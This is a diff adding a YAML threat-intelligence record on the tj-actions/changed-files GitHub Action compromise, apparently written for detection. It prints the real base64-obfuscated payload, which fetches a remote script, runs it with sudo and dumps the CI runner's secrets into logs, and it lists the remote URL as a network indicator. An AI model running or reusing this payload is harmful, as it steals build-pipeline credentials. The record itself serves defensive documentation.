@@ -1,0 +1,24 @@
+description: A malicious commit in the tj-actions/changed-files GitHub Action exposed
+  secrets by downloading and executing a remote script.
+attribution: Unknown
+TTPs:
+  processes: []
+  commandline:
+  - '''bash'', [''-c'', `echo "aWYgW1sgIiRPU1RZUEUiID09ICJsaW51eC1nbnUiIF1dOyB0aGVuCiAgQjY0X0JMT0I9YGN1cmwgLXNTZiBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25pa2l0YXN0dXBpbi8zMGU1MjViNzc2YzQwOWUwM2MyZDZmMzI4ZjI1NDk2NS9yYXcvbWVtZHVtcC5weSB8IHN1ZG8gcHl0aG9uMyB8IHRyIC1kICdcMCcgfCBncmVwIC1hb0UgJyJbXiJdKyI6XHsidmFsdWUiOiJbXiJdKiIsImlzU2VjcmV0Ijp0cnVlXH0nIHwgc29ydCAtdSB8IGJhc2U2NCAtdyAwIHwgYmFzZTY0IC13IDBgCiAgZWNobyAkQjY0X0JMT0IKZWxzZQogIGV4aXQgMApmaQo=`
+    | base64 -d > /tmp/run.sh && bash /tmp/run.sh`'
+  powershell: []
+  scripting_engine:
+  - python3
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: bash
+    destination: https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py
+    port: 443
+  file_activity:
+  - /tmp/run.sh
+  persistence: []
+  process_relations: []
+reference: https://snyk.io/blog/reconstructing-tj-actions-changed-files-github-actions-compromise/
+date_of_publication: March 16, 2025
+file_creation_date: September 01, 2025
